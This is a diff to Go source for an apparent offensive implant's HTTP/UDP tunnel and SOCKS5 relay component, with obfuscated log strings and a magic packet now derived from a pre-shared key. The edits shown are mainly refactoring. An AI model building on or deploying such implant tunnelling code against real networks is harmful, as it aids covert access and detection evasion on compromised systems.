@@ -1,11 +1,11 @@
 package commands
 
 import (
-	"implant/core/obfs"
 	"bufio"
 	"crypto/sha256"
 	"encoding/binary"
 	"fmt"
+	"implant/core/obfs"
 	Proxy "implant/core/services/proxy"
 	"implant/core/services/proxy/bufferpool"
 	"implant/core/services/proxy/mux"
@@ -28,18 +28,6 @@ var (
 
 	// HTTP隧道缓冲池
 	httpBufferPool = bufferpool.NewPool(math.MaxUint16)
-
-	// HTTP隧道魔法包（与服务端保持一致）
-	httpMagicPacket = [64]byte{
-		0x48, 0x54, 0x54, 0x50, 0x54, 0x55, 0x4e, 0x4e, // "HTTPTUNN"
-		0x45, 0x4c, 0x5f, 0x4d, 0x41, 0x47, 0x49, 0x43, // "EL_MAGIC"
-		0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x17, 0x28,
-		0x39, 0x4a, 0x5b, 0x6c, 0x7d, 0x8e, 0x9f, 0xa0,
-		0xb1, 0xc2, 0xd3, 0xe4, 0xf5, 0x06, 0x17, 0x28,
-		0x39, 0x4a, 0x5b, 0x6c, 0x7d, 0x8e, 0x9f, 0xa0,
-		0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
-		0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00,
-	}
 )
 
 // deriveClientMagicPacket 从会话 PSK 派生 64 字节魔法包（与服务端 DeriveMagicPacket 一致），
@@ -62,7 +50,6 @@ type HTTPTunnelAgent struct {
 	Session       *mux.Mux
 	Running       bool
 	StopChan      chan bool
-	mu            sync.RWMutex
 }
 
 // SOCKS5代理相关功能
@@ -155,7 +142,7 @@ func startHTTPTunnelAgent(serverAddress, psk string) {
 	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oEgfqRvCCibBN4zlmXsXvIzRSokxnEIn0="))
 	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNivqdqQKgWxXUJawh2U5V"))
 	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pk0W+LPqSsAKibBrVA6UixFGKuRUB8lvS"), serverAddress))
-	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pk0W+LPokf8SucwTVIKv9eMQL"),  len(psk)))
+	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pk0W+LPokf8SucwTVIKv9eMQL"), len(psk)))
 
 	httpTunnelMutex.Lock()
 	httpTunnelAgent = &HTTPTunnelAgent{
@@ -268,7 +255,7 @@ func startHTTPTunnelAgent(serverAddress, psk string) {
 func handleHTTPTunnelStream(stream net.Conn) error {
 	defer stream.Close()
 
-	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKhfqRkA+iQTDVPokgyGcncMFrO+QGpYgXDuKa9hK4OdUFiCPLAg=="),  stream.RemoteAddr(), stream.LocalAddr()))
+	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKhfqRkA+iQTDVPokgyGcncMFrO+QGpYgXDuKa9hK4OdUFiCPLAg=="), stream.RemoteAddr(), stream.LocalAddr()))
 
 	// 从流中读取目标地址
 	reader := bufio.NewReader(stream)
@@ -313,7 +300,7 @@ func handleHTTPTunnelStream(stream net.Conn) error {
 		defer httpBufferPool.Put(buf)
 		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpfqRkA+iQTDYJ6Ei13BVBOZeoAjEPimp1ndvrUD6L4E="))
 		n, err := io.CopyBuffer(targetConn, stream, buf[:cap(buf)])
-		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpfqckSOiaSrXIZ4hxX5VBOZeoAjEPimp1ndvrUD6L4EEluZD5iKXBLk89MoLsnLhQp12"),  n, utils.RelayEndState(err)))
+		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpfqckSOiaSrXIZ4hxX5VBOZeoAjEPimp1ndvrUD6L4EEluZD5iKXBLk89MoLsnLhQp12"), n, utils.RelayEndState(err)))
 		targetConn.Close() // server->target 结束:关闭 dst(=对端 src),解除对端 targetConn.Read 阻塞
 	}()
 
@@ -324,7 +311,7 @@ func handleHTTPTunnelStream(stream net.Conn) error {
 		defer httpBufferPool.Put(buf)
 		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpPqRkA+iQTDYJ6Ei13BVBOFaoBnEOCmp1ndoqUDrL4c="))
 		n, err := io.CopyBuffer(stream, targetConn, buf[:cap(buf)])
-		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpPqckSOiaSrXIZ4hxX5VBOFaoBnEOCmp1ndoqUDrL4cEluZD5iKXBLk89MoLsnLhQp12"),  n, utils.RelayEndState(err)))
+		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpPqckSOiaSrXIZ4hxX5VBOFaoBnEOCmp1ndoqUDrL4cEluZD5iKXBLk89MoLsnLhQp12"), n, utils.RelayEndState(err)))
 		stream.Close() // target->server 结束:关闭 stream(=对端 src),解除对端 stream.Read 阻塞
 	}()
 
@@ -401,7 +388,7 @@ func handleUDPTunnelStream(stream net.Conn) error {
 	}
 	udpConn, err := net.Dial("udp", string(target))
 	if err != nil {
-		log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrLum+51HcyQDws/9gf6l2sFXKBLBI6F6EOg=="),  string(target), err))
+		log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrLum+51HcyQDws/9gf6l2sFXKBLBI6F6EOg=="), string(target), err))
 		binary.Write(stream, binary.BigEndian, uint32(0))
 		return err
 	}
